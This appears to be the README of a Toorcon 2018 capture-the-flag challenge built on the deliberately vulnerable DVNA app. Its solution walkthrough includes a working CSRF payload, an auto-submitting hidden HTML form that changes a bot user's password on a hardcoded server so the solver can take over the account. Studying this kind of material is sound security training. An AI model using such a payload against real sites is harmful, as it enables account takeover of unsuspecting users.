# crapple-ctf
CTF based on dvna. Created for Toorcon 2018

Demo:
http://crapple-ctf.samkirby.com

SOLUTION BELOW:
This challenge utilizes a bot that poses as a human monitoring an email inbox. This bot utilizes a headless Chromium browser controlled by Puppeteer javascript. This bot will click the first valid URL it sees in the email message (http, https, www) while having his account logged in with a different tab.
To solve, first create an account and log into the /login page. You can use my premade credentials if you want to skip registration (skirby, iamsam123)
Check out the source code of the Account Settings page. You can see that on submission, it will POST a request to change the password with the username, email, and passwords provided. This is what we'll use to construct our payload.
Click the 'Contact us' link on the upper right. This will bring up the email form which you will use to submit your payload
In that email form, paste your CSRF payload in the form of a URL. You can host it yourself or use a pastebin site. Just make sure you're pasting in the live output version of the URL . I've made one you can use here: 
http://jsbin.com/buminecive/1 
When the link inevitibly expires, use the source below and host it somewhere. 
```
<html>
<head>Bossman CSRF Hack</head>
    <body onload='document.hidden_form.submit()'>
      <form name="hidden_form" method="POST" action="http://ec2-54-200-171-193.us-west-2.compute.amazonaws.com/app/useredit">
        <input type="hidden" name="name" value="Bossman">
        <input type="hidden" name="login" value="bossman">
        <input type="hidden" name="email" value="bossman@qualcomm.com">
        <input type="hidden" name="password" value="lolugothacked">
        <input type="hidden" name="cpassword" value="lolugothacked">
        </form>
    </body>
</html>
```
Be sure to replace the URL with the proper URL of the site you're trying to attack. Once you're done, create a hyperlink to that page and paste it into the mail field. Click submit. The banner will tell you whether or not it clicked the link
If the CSRF payload was written correctly, the robot will have inadvertently submitted a POST request to reset his password using his own cookies. This will bypass the same origin policy that chrome has in place because the POST request will have the same URL as the host website. Since there is no proper CSRF token, the server will not know the difference between a valid or malicious request.
You can now logout, and then log back in as user 'bossman' with password 'lolugothacked'. The admin panel with the flag will now be visible!
